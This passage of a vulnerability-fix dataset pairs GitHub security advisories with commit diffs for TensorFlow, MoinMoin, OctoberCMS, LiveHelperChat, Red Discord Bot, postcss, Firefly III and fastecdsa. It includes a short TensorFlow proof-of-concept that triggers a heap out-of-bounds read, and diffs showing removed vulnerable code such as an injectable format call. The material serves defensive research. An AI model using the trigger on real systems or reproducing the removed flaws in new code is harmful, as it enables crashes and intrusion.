InvalidArgument(\\n+              \"Ragged splits should be non decreasing, but we got \",\\n+              rt_nested_splits[i](j - 1), \" followed by \",\\n+              rt_nested_splits[i](j));\\n+        }\\n+      }\\n       if (i > 0) {\\n         SPLITS_TYPE last_split =\\n             rt_nested_splits[i - 1](rt_nested_splits[i - 1].size() - 1);'}}","message_norm":"add missing validation to `raggedtensortosparse`.\n\nthere needs to be a check that the splits allow for valid ragged tensors.\n\npiperorigin-revid: 387712169\nchange-id: i2499175324b82b65d159a260c7f83b98ceb5cc7d","language":"en","entities":"[('add', 'ACTION', ''), ('missing validation', 'SECWORD', ''), ('387712169', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/ragged_tensor_to_sparse_kernel.cc'])","num_files":1.0},{"index":531,"vuln_id":"GHSA-52q8-877j-gghq","cwe_id":"{'CWE-22'}","score":0.0,"chain":"{'https:\/\/github.com\/moinwiki\/moin-1.9\/commit\/6b96a9060069302996b5af47fd4a388fc80172b7'}","dataset":"osv","summary":"remote code execution via cache action in MoinMoin ### Impact\nThe cache action in action\/cache.py allows directory traversal through a crafted HTTP request. An attacker who can upload attachments to\nthe wiki can use this to achieve remote code execution.\n\n### Patches\nUsers are strongly advised to upgrade to a patched version.\n\nMoinMoin Wiki 1.9.11 has the necessary fixes and also contains other important fixes.\n\n### Workarounds\nIt is not advised to work around this, but to upgrade MoinMoin to a patched version.\n\nThat said, a work around via disabling the `cache` or the `AttachFile` action might be possible.\n\nAlso, it is of course helpful if you give `write` permissions (which include uploading attachments) only to trusted users.\n\n### Credits\n\nThis vulnerability was discovered by Michael Chapman.\n\n### For more information\nIf you have any questions or comments about this advisory, email me at [twaldmann@thinkmo.de](mailto:twaldmann@thinkmo.de).","published_date":"2020-11-11","chain_len":1,"project":"https:\/\/github.com\/moinwiki\/moin-1.9","commit_href":"https:\/\/github.com\/moinwiki\/moin-1.9\/commit\/6b96a9060069302996b5af47fd4a388fc80172b7","commit_sha":"6b96a9060069302996b5af47fd4a388fc80172b7","patch":"SINGLE","chain_ord":"['6b96a9060069302996b5af47fd4a388fc80172b7']","before_first_fix_commit":"{'d1e5fc7d3708d877353ca64dd4aa7cfd1cde4cb4', '31de9139d0aabc171e94032168399b4a0b2a88a2'}","last_fix_commit":"6b96a9060069302996b5af47fd4a388fc80172b7","chain_ord_pos":1.0,"commit_datetime":"11\/08\/2020, 16:21:56","message":"Merge pull request from GHSA-52q8-877j-gghq\n\nsecurity: fix remote code execution via cache action, CVE-2020-25074","author":"TW","comments":null,"stats":"{'additions': 20, 'deletions': 7, 'total': 27}","files":"{'MoinMoin\/action\/cache.py': {'additions': 20, 'deletions': 7, 'changes': 27, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/moinwiki\/moin-1.9\/raw\/6b96a9060069302996b5af47fd4a388fc80172b7\/MoinMoin%2Faction%2Fcache.py', 'patch': \"@@ -103,6 +103,19 @@ def key(request, wikiname=None, itemname=None, attachname=None, content=None, se\\n     return key\\n \\n \\n+def valid_key(key):\\n+    # make sure the key looks like keys generated by key()\\n+    if not isinstance(key, unicode):\\n+        # key is None (not given in url args) or something unexpected\\n+        return False\\n+    try:\\n+        int(key, 16)  # try to evaluate as hex number\\n+    except ValueError:\\n+        # was not a hex number\\n+        return False\\n+    return len(key) == 40  # hmac-sha1 hexdigest == 40 hex chars\\n+\\n+\\n def put(request, key, data,\\n         filename=None,\\n         content_type=None,\\n@@ -234,14 +247,14 @@ def _do_remove(request, key):\\n     remove(request, key)\\n \\n \\n-def _do(request, do, key):\\n-    if do == 'get':\\n-        _do_get(request, key)\\n-    elif do == 'remove':\\n-        _do_remove(request, key)\\n-\\n def execute(pagename, request):\\n     do = request.values.get('do')\\n     key = request.values.get('key')\\n-    _do(request, do, key)\\n+    valid = valid_key(key)  # validate untrusted input\\n+    if valid and do == 'get':\\n+        _do_get(request, key)\\n+    elif valid and do == 'remove':\\n+        _do_remove(request, key)\\n+    else:\\n+        request.status_code = 404\"}}","message_norm":"merge pull request from ghsa-52q8-877j-gghq\n\nsecurity: fix remote code execution via cache action, cve-2020-25074","language":"en","entities":"[('ghsa-52q8-877j-gghq', 'VULNID', 'GHSA'), ('security', 'SECWORD', ''), ('fix', 'ACTION', ''), ('remote code execution', 'SECWORD', ''), ('cve-2020-25074', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['MoinMoin\/action\/cache.py'])","num_files":1.0},{"index":539,"vuln_id":"GHSA-53m6-44rc-h2q5","cwe_id":"{'CWE-347'}","score":4.8,"chain":"{'https:\/\/github.com\/octobercms\/october\/commit\/e3b455ad587282f0fbcb7763c6d9c3d000ca1e6a'}","dataset":"osv","summary":"Missing server signature validation in OctoberCMS ### Impact\n\nThis advisory affects authors of plugins and themes listed on the October CMS marketplace where an end-user will inadvertently expose authors to potential financial loss by entering their private license key into a compromised server.\n\nIt has been disclosed that a project fork of October CMS v1.0 is using a compromised gateway to access the October CMS marketplace service. The compromised gateway captures the personal\/business information of users and authors, including private source code files. It was also disclosed that captured plugin files are freely redistributed to other users without authorization.\n\n1. End-users are provided with a forked version of October CMS v1.0. The provided software is modified to use a compromised gateway server.\n\n2. The user is instructed to enter their October CMS license key into the administration panel to access the October CMS marketplace. The key is sent to the compromised server while appearing to access the genuine October CMS gateway server.\n\n3. The compromised gateway server uses a \"man in the middle\" mechanism that captures information while forwarding the request to the genuine October CMS gateway and relaying the response back to the client.\n\n4. The compromised gateway server stores the license key and other information about the user account including client name, email address and contents of purchased plugins and privately uploaded plugin files. \n\n5. The stored plugin files are made available to other users of the compromised gateway server.\n\n### Patches\n\nThe issue has been patched in Build 475 (v1.0.475) and v1.1.11.\n\n### Workarounds\n\nApply https:\/\/github.com\/octobercms\/october\/commit\/e3b455ad587282f0fbcb7763c6d9c3d000ca1e6a to your installation manually if unable to upgrade to Build 475 or v1.1.11.\n\n### Recommendations\n\nWe recommend the following steps to make sure your account information stays secure:\n\n- Do not share your license key with anyone except October CMS.\n- Check to make sure that your gateway update server has not been modified.\n- Be aware of phishing websites, including other platforms that use the same appearance.\n- For authors, you may contact us for help requesting the removal of affected plugins.\n- Before providing plugin support, verify that the user holds a legitimate copy of the plugin.\n\n### References\n\nCredits for research on this exploit:\n\u2022 Nikita Khaetsky\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Email us at [hello@octobercms.com](mailto:hello@octobercms.com)","published_date":"2022-02-24","chain_len":1,"project":"https:\/\/github.com\/octobercms\/october","commit_href":"https:\/\/github.com\/octobercms\/october\/commit\/e3b455ad587282f0fbcb7763c6d9c3d000ca1e6a","commit_sha":"e3b455ad587282f0fbcb7763c6d9c3d000ca1e6a","patch":"SINGLE","chain_ord":"['e3b455ad587282f0fbcb7763c6d9c3d000ca1e6a']","before_first_fix_commit":"{'e6867a5eb69f5c723adb33b6ca97fcda99634446'}","last_fix_commit":"e3b455ad587282f0fbcb7763c6d9c3d000ca1e6a","chain_ord_pos":1.0,"commit_datetime":"02\/20\/2022, 01:54:45","message":"Checks gateway server has a valid signature","author":"Sam Georges","comments":null,"stats":"{'additions': 38, 'deletions': 2, 'total': 40}","files":"{'modules\/system\/classes\/UpdateManager.php': {'additions': 38, 'deletions': 2, 'changes': 40, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/octobercms\/october\/raw\/e3b455ad587282f0fbcb7763c6d9c3d000ca1e6a\/modules%2Fsystem%2Fclasses%2FUpdateManager.php', 'patch': \"@@ -8,6 +8,7 @@\\n use Cache;\\n use Schema;\\n use Config;\\n+use Request;\\n use ApplicationException;\\n use Cms\\\\Classes\\\\ThemeManager;\\n use System\\\\Models\\\\Parameter;\\n@@ -885,6 +886,10 @@ public function requestServerData($uri, $postData = [])\\n             throw new ApplicationException(Lang::get('system::lang.server.response_invalid'));\\n         }\\n \\n+        if (!$this->validateServerSignature($resultData, $result->headers['Rest-Sign'] ?? '')) {\\n+            throw new ApplicationException(Lang::get('system::lang.server.response_invalid') . ' (Bad signature)');\\n+        }\\n+\\n         return $resultData;\\n     }\\n \\n@@ -963,12 +968,13 @@ protected function createServerUrl($uri)\\n      *\/\\n     protected function applyHttpAttributes($http, $postData)\\n     {\\n-        $postData['protocol_version'] = '1.2';\\n-        $postData['client'] = 'october';\\n+        $postData['protocol_version'] = '1.3';\\n+        $postData['client'] = 'October CMS';\\n \\n         $postData['server'] = base64_encode(json_encode([\\n             'php'   => PHP_VERSION,\\n             'url'   => Url::to('\/'),\\n+            'ip'    => Request::ip(),\\n             'since' => PluginVersion::orderBy('created_at')->value('created_at')\\n         ]));\\n \\n@@ -1070,4 +1076,34 @@ protected function printMessages()\\n             }\\n         }\\n     }\\n+\\n+    \/**\\n+     * validateServerSignature checks the server has provided a valid signature\\n+     *\\n+     * @return bool\\n+     *\/\\n+    protected function validateServerSignature($data, $signature)\\n+    {\\n+        if (!$signature) {\\n+            return false;\\n+        }\\n+\\n+        $signature = base64_decode($signature);\\n+\\n+        $pubKey = '-----BEGIN PUBLIC KEY-----\\n+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt+KwvTXqC8Mz9vV4KIvX\\n+3y+aZusrlg26jdbNVUuhXNFbt1VisjJydHW2+WGsiEHSy2s61ZAV2dICR6f3huSw\\n+jY\/MH9j23Oo\/u61CBpvIS3Q8uC+TLtJl4\/F9eqlnzocfMoKe8NmcBbUR3TKQoIok\\n+xbSMl6jiE2k5TJdzhHUxjZRIeeLDLMKYX6xt37LdhuM8zO6sXQmCGg4J6LmHTJph\\n+96H11gBvcFSFJSmIiDykJOELZl\/aVcY1g3YgpL0mw5Bw1VTmKaRdz1eBi9DmKrKX\\n+UijG4gD8eLRV\/FS\/sZCFNR\/evbQXvTBxO0TOIVi85PlQEcMl4SBj0CoTyNbcAGtz\\n+4wIDAQAB\\n+-----END PUBLIC KEY-----';\\n+\\n+        $pubKey = Config::get('system.update_gateway_key', $pubKey);\\n+\\n+        $data = base64_encode(json_encode($data));\\n+\\n+        return openssl_verify($data, $signature, $pubKey) === 1;\\n+    }\\n }\"}}","message_norm":"checks gateway server has a valid signature","language":"en","entities":"[('server', 'SECWORD', ''), ('signature', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/system\/classes\/UpdateManager.php'])","num_files":1.0},{"index":545,"vuln_id":"GHSA-545v-42p7-98fq","cwe_id":"{'CWE-125'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/dcd7867de0fea4b72a2b34bd41eb74548dc23886'}","dataset":"osv","summary":"Heap out of bounds read in `MaxPoolGradWithArgmax` ### Impact\nThe implementation of `tf.raw_ops.MaxPoolGradWithArgmax` can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant([10.0, 10.0, 10.0], shape=[1, 1, 3, 1], dtype=tf.float32)\ngrad = tf.constant([10.0, 10.0, 10.0, 10.0], shape=[1, 1, 1, 4], dtype=tf.float32)\nargmax = tf.constant([1], shape=[1], dtype=tf.int64)\nksize = [1, 1, 1, 1]\nstrides = [1, 1, 1, 1]\n  \ntf.raw_ops.MaxPoolGradWithArgmax(\n  input=input, grad=grad, argmax=argmax, ksize=ksize, strides=strides,\n  padding='SAME', include_batch_in_index=False)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/ef0c008ee84bad91ec6725ddc42091e19a30cf0e\/tensorflow\/core\/kernels\/maxpooling_op.cc#L1016-L1017) uses the same value to index in two different arrays but there is no guarantee that the sizes are identical. \n\n### Patches\nWe have patched the issue in GitHub commit [dcd7867de0fea4b72a2b34bd41eb74548dc23886](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/dcd7867de0fea4b72a2b34bd41eb74548dc23886).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/dcd7867de0fea4b72a2b34bd41eb74548dc23886","commit_sha":"dcd7867de0fea4b72a2b34bd41eb74548dc23886","patch":"SINGLE","chain_ord":"['dcd7867de0fea4b72a2b34bd41eb74548dc23886']","before_first_fix_commit":"{'ef0c008ee84bad91ec6725ddc42091e19a30cf0e'}","last_fix_commit":"dcd7867de0fea4b72a2b34bd41eb74548dc23886","chain_ord_pos":1.0,"commit_datetime":"05\/05\/2021, 15:38:03","message":"Fix heap buffer overflow\n\nPiperOrigin-RevId: 372132844\nChange-Id: Idef9895efaf145f2b1c23d31983601ec980cd5e4","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/kernels\/maxpooling_op.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/dcd7867de0fea4b72a2b34bd41eb74548dc23886\/tensorflow%2Fcore%2Fkernels%2Fmaxpooling_op.cc', 'patch': '@@ -1014,6 +1014,9 @@ struct LaunchMaxPoolingGradWithArgmax<CPUDevice, T> {\\n         const int input_start = start * input_size_per_batch;\\n         const int input_end = limit * input_size_per_batch;\\n         for (int64 index = input_start; index < input_end; index++) {\\n+          if (index >= argmax.NumElements()) {\\n+            break;\\n+          }\\n           int64 grad_out_index = argmax_flat(index);\\n           if (!include_batch_in_index) {\\n             const int64 cur_batch = index \/ input_size_per_batch;'}}","message_norm":"fix heap buffer overflow\n\npiperorigin-revid: 372132844\nchange-id: idef9895efaf145f2b1c23d31983601ec980cd5e4","language":"en","entities":"[('fix', 'ACTION', ''), ('buffer overflow', 'SECWORD', ''), ('372132844', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/maxpooling_op.cc'])","num_files":1.0},{"index":552,"vuln_id":"GHSA-54qq-9chj-rxhv","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/livehelperchat\/livehelperchat\/commit\/8fdb4f67ac1a095331aa0fb4630ef9dfe8e75dcb'}","dataset":"osv","summary":"Cross-site Scripting in LiveHelperChat LiveHelperChat prior to version 3.93 contains a cross-site scripting vulnerability.","published_date":"2022-01-29","chain_len":1,"project":"https:\/\/github.com\/livehelperchat\/livehelperchat","commit_href":"https:\/\/github.com\/livehelperchat\/livehelperchat\/commit\/8fdb4f67ac1a095331aa0fb4630ef9dfe8e75dcb","commit_sha":"8fdb4f67ac1a095331aa0fb4630ef9dfe8e75dcb","patch":"SINGLE","chain_ord":"['8fdb4f67ac1a095331aa0fb4630ef9dfe8e75dcb']","before_first_fix_commit":"{'d7b85466c217b3750eaccc8703ce54ba8785c4d3'}","last_fix_commit":"8fdb4f67ac1a095331aa0fb4630ef9dfe8e75dcb","chain_ord_pos":1.0,"commit_datetime":"01\/27\/2022, 20:08:18","message":"Escape in user box","author":"Remigijus Kiminas","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lhc_web\/design\/defaulttheme\/tpl\/pagelayouts\/parts\/user_box.tpl.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/LiveHelperChat\/livehelperchat\/raw\/8fdb4f67ac1a095331aa0fb4630ef9dfe8e75dcb\/lhc_web%2Fdesign%2Fdefaulttheme%2Ftpl%2Fpagelayouts%2Fparts%2Fuser_box.tpl.php', 'patch': '@@ -12,7 +12,7 @@\\n \\n ?>\\n <li class=\"nav-item dropleft\">\\n-    <a href=\"#\" class=\"nav-link dropdown-toggle\" data-toggle=\"dropdown\" role=\"button\" aria-expanded=\"false\"><?php echo htmlspecialchars($UserData->name),\\' \\',htmlspecialchars($UserData->surname)?><\/a>\\n+    <a href=\"#\" class=\"nav-link dropdown-toggle\" data-toggle=\"dropdown\" role=\"button\" aria-expanded=\"false\" ng-non-bindable><?php echo htmlspecialchars($UserData->name),\\' \\',htmlspecialchars($UserData->surname)?><\/a>\\n     <div class=\"dropdown-menu\" style=\"min-width: 25rem;\" role=\"menu\">\\n \\n         <div class=\"row\">'}}","message_norm":"escape in user box","language":"en","entities":"[('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lhc_web\/design\/defaulttheme\/tpl\/pagelayouts\/parts\/user_box.tpl.php'])","num_files":1.0},{"index":557,"vuln_id":"GHSA-55j9-849x-26h4","cwe_id":"{'CWE-74'}","score":8.2,"chain":"{'https:\/\/github.com\/Cog-Creators\/Red-DiscordBot\/pull\/4175\/commits\/9ab536235bafc2b42c3c17d7ce26f1cc64482a81'}","dataset":"osv","summary":"Remote Code Execution in Red Discord Bot ### Impact\nA RCE exploit has been discovered in the Trivia module: this exploit allows Discord users with specifically crafted usernames to inject code into the Trivia module's leaderboard command. By abusing this exploit, it's possible to perform destructive actions and\/or access sensitive information.\n\n### Patches\nThis critical exploit has been fixed on version 3.3.11.\n\n### Workarounds\nUnloading the Trivia module with ``unload trivia`` can render this exploit not accessible. We still highly recommend updating to 3.3.11 to completely patch this issue.\n\n### References\nhttps:\/\/github.com\/Cog-Creators\/Red-DiscordBot\/pull\/4175\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Cog-Creators\/Red-DiscordBot](https:\/\/github.com\/Cog-Creators\/Red-DiscordBot)\n* Over on our [Discord server](https:\/\/discord.gg\/red)","published_date":"2020-08-21","chain_len":1,"project":"https:\/\/github.com\/Cog-Creators\/Red-DiscordBot","commit_href":"https:\/\/github.com\/Cog-Creators\/Red-DiscordBot\/pull\/4175\/commits\/9ab536235bafc2b42c3c17d7ce26f1cc64482a81","commit_sha":"9ab536235bafc2b42c3c17d7ce26f1cc64482a81","patch":"SINGLE","chain_ord":"['9ab536235bafc2b42c3c17d7ce26f1cc64482a81']","before_first_fix_commit":"{'c8526d42b4299d50b0c69f86204723cc82754453'}","last_fix_commit":"9ab536235bafc2b42c3c17d7ce26f1cc64482a81","chain_ord_pos":1.0,"commit_datetime":"08\/09\/2020, 23:11:15","message":"Remove an unnecessary `.format`","author":"Flame442","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'redbot\/cogs\/trivia\/trivia.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Cog-Creators\/Red-DiscordBot\/raw\/9ab536235bafc2b42c3c17d7ce26f1cc64482a81\/redbot%2Fcogs%2Ftrivia%2Ftrivia.py', 'patch': '@@ -539,7 +539,7 @@ def _get_leaderboard(data: dict, key: str, top: int):\\n             )\\n             padding = [\" \" * (len(h) - len(f)) for h, f in zip(headers, fields)]\\n             fields = tuple(f + padding[i] for i, f in enumerate(fields))\\n-            lines.append(\" | \".join(fields).format(member=member, **m_data))\\n+            lines.append(\" | \".join(fields))\\n             if rank == top:\\n                 break\\n         return \"\\\\n\".join(lines)'}}","message_norm":"remove an unnecessary `.format`","language":"en","entities":"[('remove', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['redbot\/cogs\/trivia\/trivia.py'])","num_files":1.0},{"index":564,"vuln_id":"GHSA-566m-qj78-rww5","cwe_id":"{'CWE-400'}","score":5.3,"chain":"{'https:\/\/github.com\/postcss\/postcss\/commit\/2b1d04c867995e55124e0a165b7c6622c1735956'}","dataset":"osv","summary":"Regular Expression Denial of Service in postcss The package postcss versions before 7.0.36 or between 8.0.0 and 8.2.13 are vulnerable to Regular Expression Denial of Service (ReDoS) via getAnnotationURL() and loadAnnotation() in lib\/previous-map.js. The vulnerable regexes are caused mainly by the sub-pattern \\\/\\*\\s* sourceMappingURL=(.*).","published_date":"2022-01-07","chain_len":1,"project":"https:\/\/github.com\/postcss\/postcss","commit_href":"https:\/\/github.com\/postcss\/postcss\/commit\/2b1d04c867995e55124e0a165b7c6622c1735956","commit_sha":"2b1d04c867995e55124e0a165b7c6622c1735956","patch":"SINGLE","chain_ord":"['2b1d04c867995e55124e0a165b7c6622c1735956']","before_first_fix_commit":"{'dc6cff1d7f9e0d6cba440d1b4f797a0f57b13595', '2ad1ca9b965dde32223bee28dc259c339cbaaa05'}","last_fix_commit":"2b1d04c867995e55124e0a165b7c6622c1735956","chain_ord_pos":1.0,"commit_datetime":"04\/26\/2021, 12:08:17","message":"Merge pull request #1567 from yetingli\/main\n\nFix ReDoS in previous-map","author":"Andrey Sitnik","comments":"{'com_1': {'author': 'abergmann', 'datetime': '04\/27\/2021, 06:37:03', 'body': '[CVE-2021-23382](https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2021-23382) was assigned to this commit.'}}","stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'lib\/previous-map.js': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/postcss\/postcss\/raw\/2b1d04c867995e55124e0a165b7c6622c1735956\/lib%2Fprevious-map.js', 'patch': '@@ -48,11 +48,11 @@ class PreviousMap {\\n   }\\n \\n   getAnnotationURL(sourceMapString) {\\n-    return sourceMapString.match(\/\\\\\/\\\\*\\\\s*# sourceMappingURL=(.*)\\\\*\\\\\/\/)[1].trim()\\n+    return sourceMapString.match(\/\\\\\/\\\\*\\\\s*# sourceMappingURL=((?:(?!sourceMappingURL=).)*)\\\\*\\\\\/\/)[1].trim()\\n   }\\n \\n   loadAnnotation(css) {\\n-    let annotations = css.match(\/\\\\\/\\\\*\\\\s*# sourceMappingURL=.*\\\\*\\\\\/\/gm)\\n+    let annotations = css.match(\/\\\\\/\\\\*\\\\s*# sourceMappingURL=(?:(?!sourceMappingURL=).)*\\\\*\\\\\/\/gm)\\n \\n     if (annotations && annotations.length > 0) {\\n       \/\/ Locate the last sourceMappingURL to avoid picking up'}}","message_norm":"merge pull request #1567 from yetingli\/main\n\nfix redos in previous-map","language":"en","entities":"[('#1567', 'ISSUE', ''), ('redos', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/previous-map.js'])","num_files":1.0},{"index":565,"vuln_id":"GHSA-56cx-wf47-hx7w","cwe_id":"{'CWE-307'}","score":5.3,"chain":"{'https:\/\/github.com\/firefly-iii\/firefly-iii\/commit\/afc9f4b7ebc8a240c85864a6e1abda62bfeefae8'}","dataset":"osv","summary":" Improper Restriction of Excessive Authentication Attempts firefly-iii is vulnerable to Improper Restriction of Excessive Authentication Attempts","published_date":"2021-08-09","chain_len":1,"project":"https:\/\/github.com\/firefly-iii\/firefly-iii","commit_href":"https:\/\/github.com\/firefly-iii\/firefly-iii\/commit\/afc9f4b7ebc8a240c85864a6e1abda62bfeefae8","commit_sha":"afc9f4b7ebc8a240c85864a6e1abda62bfeefae8","patch":"SINGLE","chain_ord":"['afc9f4b7ebc8a240c85864a6e1abda62bfeefae8']","before_first_fix_commit":"{'cb759e5c21118cf18b29cb4619d7a2a540a9c76f'}","last_fix_commit":"afc9f4b7ebc8a240c85864a6e1abda62bfeefae8","chain_ord_pos":1.0,"commit_datetime":"07\/23\/2021, 04:26:42","message":"Add missing rate limiter.","author":"James Cole","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'app\/Http\/Controllers\/Auth\/LoginController.php': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/firefly-iii\/firefly-iii\/raw\/afc9f4b7ebc8a240c85864a6e1abda62bfeefae8\/app%2FHttp%2FControllers%2FAuth%2FLoginController.php', 'patch': '@@ -29,6 +29,7 @@\\n use FireflyIII\\\\Providers\\\\RouteServiceProvider;\\n use Illuminate\\\\Contracts\\\\View\\\\Factory;\\n use Illuminate\\\\Foundation\\\\Auth\\\\AuthenticatesUsers;\\n+use Illuminate\\\\Foundation\\\\Auth\\\\ThrottlesLogins;\\n use Illuminate\\\\Http\\\\JsonResponse;\\n use Illuminate\\\\Http\\\\RedirectResponse;\\n use Illuminate\\\\Http\\\\Request;\\n@@ -47,7 +48,7 @@\\n  *\/\\n class LoginController extends Controller\\n {\\n-    use AuthenticatesUsers;\\n+    use AuthenticatesUsers, ThrottlesLogins;\\n \\n     \/**\\n      * Where to redirect users after login.'}}","message_norm":"add missing rate limiter.","language":"et","entities":"[('add', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Http\/Controllers\/Auth\/LoginController.php'])","num_files":1.0},{"index":566,"vuln_id":"GHSA-56wv-2wr9-3h9r","cwe_id":"{'CWE-347'}","score":7.5,"chain":"{'https:\/\/github.com\/AntonKueltz\/fastecdsa\/commit\/e592f106edd5acf6dacedfab2ad16fe6c735c9d1', 'https:\/\/github.com\/AntonKueltz\/fastecdsa\/commit\/7b64e3efaa806b4daaf73bb5172af3581812f8de', 'https:\/\/github.com\/AntonKueltz\/fastecdsa\/commit\/4a16daeaf139be20654ef58a9fe4c79dc030458c'}","dataset":"osv","summary":"Improper Verification of Cryptographic Signature in fastecdsa An issue was discovered in fastecdsa before 2.1.2. When using the NIST P-256 curve in the ECDSA implementation, the point at infinity is mishandled. This means that for an extreme value in k and s^-1, the signature verification fails even if the signature is correct. This behavior is not solely a usability problem. There are some threat models where an attacker can benefit by successfully guessing users for whom signature verification will fail.","published_date":"2021-10-12","chain_len":3,"project":"https:\/\/github.com\/AntonKueltz\/fastecdsa","commit_href":"https:\/\/github.com\/AntonKueltz\/fastecdsa\/commit\/e592f106edd5acf6dacedfab2ad16fe6c735c9d1","commit_sha":"e592f106edd5acf6dacedfab2ad16fe6c735c9d1","patch":"MULTI","chain_ord":"['e592f106edd5acf6dacedfab2ad16fe6c735c9d1', '7b64e3efaa806b4daaf73bb5172af3581812f8de', '4a16daeaf139be20654ef58a9fe4c79dc030458c']","before_first_fix_commit":"{'7b64e3efaa806b4daaf73bb5172af3581812f8de'}","last_fix_commit":"4a16daeaf139be20654ef58a9fe4c79dc030458c","chain_ord_pos":1.0,"commit_datetime":"04\/14\/2020, 09:15:41","message":"Properly handle the point at infinity","author":"AntonKueltz","comments":null,"stats":"{'additions': 50, 'deletions': 1, 'total': 51}","files":"{'src\/curveMath.c': {'additions': 50, 'deletions': 1, 'changes': 51, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/AntonKueltz\/fastecdsa\/raw\/e592f106edd5acf6dacedfab2ad16fe6c735c9d1\/src%2FcurveMath.c', 'patch': '@@ -15,7 +15,22 @@ int pointZZ_pEqual(const PointZZ_p * op1, const PointZZ_p * op2) {\\n }\\n \\n \\n+int pointZZ_pIsIdentityElement(const PointZZ_p * op) {\\n+    return mpz_cmp_ui(op->x, 0) == 0 && mpz_cmp_ui(op->y, 0) == 0 ? 1 : 0;\\n+}\\n+\\n+\\n+void pointZZ_pSetToIdentityElement(PointZZ_p * op) {\\n+    mpz_set_ui(op->x, 0);\\n+    mpz_set_ui(op->y, 0);\\n+}\\n+\\n+\\n void pointZZ_pDouble(PointZZ_p * rop, const PointZZ_p * op, const CurveZZ_p * curve) {\\n+    if(pointZZ_pIsIdentityElement(op)) {\\n+        return pointZZ_pSetToIdentityElement(rop);\\n+    }\\n+\\n     mpz_t numer, denom, lambda;\\n     mpz_inits(numer, denom, lambda, NULL);\\n \\n@@ -45,6 +60,35 @@ void pointZZ_pDouble(PointZZ_p * rop, const PointZZ_p * op, const CurveZZ_p * cu\\n \\n \\n void pointZZ_pAdd(PointZZ_p * rop, const PointZZ_p * op1, const PointZZ_p * op2, const CurveZZ_p * curve) {\\n+    \/\/ handle identity element cases\\n+    if(pointZZ_pIsIdentityElement(op1) && pointZZ_pIsIdentityElement(op2)) {\\n+        return pointZZ_pSetToIdentityElement(rop);\\n+    } else if(pointZZ_pIsIdentityElement(op1)) {\\n+        mpz_set(rop->x, op2->x);\\n+        mpz_set(rop->y, op2->y);\\n+        return;\\n+    } else if(pointZZ_pIsIdentityElement(op2)) {\\n+        mpz_set(rop->x, op1->x);\\n+        mpz_set(rop->y, op1->y);\\n+        return;\\n+    }\\n+\\n+    \/\/ use doubling algorithm if points are equal\\n+    if(pointZZ_pEqual(op1, op2)) {\\n+        pointZZ_pDouble(rop, op1, curve);\\n+        return;\\n+    }\\n+\\n+    \/\/ check if points sum to identity element\\n+    mpz_t negy;\\n+    mpz_init(negy);\\n+    mpz_sub(negy, curve->p, op2->y);\\n+    if(mpz_cmp(op1->x, op2->x) == 0 && mpz_cmp(op1->y, negy) == 0) {\\n+        mpz_clear(negy);\\n+        return pointZZ_pSetToIdentityElement(rop);\\n+    }\\n+\\n+\\n     mpz_t xdiff, ydiff, lambda;\\n     mpz_inits(xdiff, ydiff, lambda, NULL);\\n \\n@@ -67,11 +111,16 @@ void pointZZ_pAdd(PointZZ_p * rop, const PointZZ_p * op1, const PointZZ_p * op2,\\n     mpz_sub(rop->y, rop->y, op1->y);\\n     mpz_mod(rop->y, rop->y, curve->p);\\n \\n-    mpz_clears(xdiff, ydiff, lambda, NULL);\\n+    mpz_clears(negy, xdiff, ydiff, lambda, NULL);\\n }\\n \\n \\n void pointZZ_pMul(PointZZ_p * rop, const PointZZ_p * point, const mpz_t scalar, const CurveZZ_p * curve) {\\n+    \/\/ handle the identity element\\n+    